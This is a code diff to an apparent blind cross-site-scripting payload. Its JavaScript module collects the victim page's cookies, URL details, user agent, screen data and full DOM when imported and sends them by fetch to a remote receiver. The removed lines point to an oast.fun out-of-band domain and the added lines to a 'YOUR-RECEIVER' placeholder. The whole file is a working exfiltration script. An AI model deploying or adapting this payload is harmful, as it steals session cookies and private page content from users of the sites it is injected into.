@@ -23,44 +23,29 @@ export async function collect() {
 
         isTopLevel: window === window.top,
 
-        dom: document.documentElement.outerHTML,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+        },
 
-        stack: new Error().stack
+        viewport: {
+            width: window.innerWidth,
+            height: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio,
+        },
+
+        dom: document.documentElement.outerHTML,
     };
 
-    const body = new FormData();
-
-    body.append("collector", data.collector);
-    body.append("timestamp", data.timestamp);
-    body.append("href", data.href);
-    body.append("origin", data.origin);
-    body.append("protocol", data.protocol);
-    body.append("hostname", data.hostname);
-    body.append("pathname", data.pathname);
-    body.append("search", data.search);
-    body.append("hash", data.hash);
-    body.append("title", data.title);
-    body.append("referrer", data.referrer);
-    body.append("domain", data.domain);
-    body.append("cookies", data.cookies);
-    body.append("userAgent", data.userAgent);
-    body.append("language", data.language);
-    body.append("platform", data.platform);
-    body.append("isTopLevel", String(data.isTopLevel));
-    body.append("stack", data.stack || "");
-
-    body.append("dom", data.dom);
-
-    await fetch("https://yfbeqwpiwqjmuewwrgoafb56fi4v0lhqj.oast.fun", {
+    await fetch("https://YOUR-RECEIVER", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify(data),
-        mode: "no-cors",
-        keepalive: true
+        body: JSON.stringify(data)
     });
 }
 
-// Automatically collect when imported.
 collect().catch(() => {});
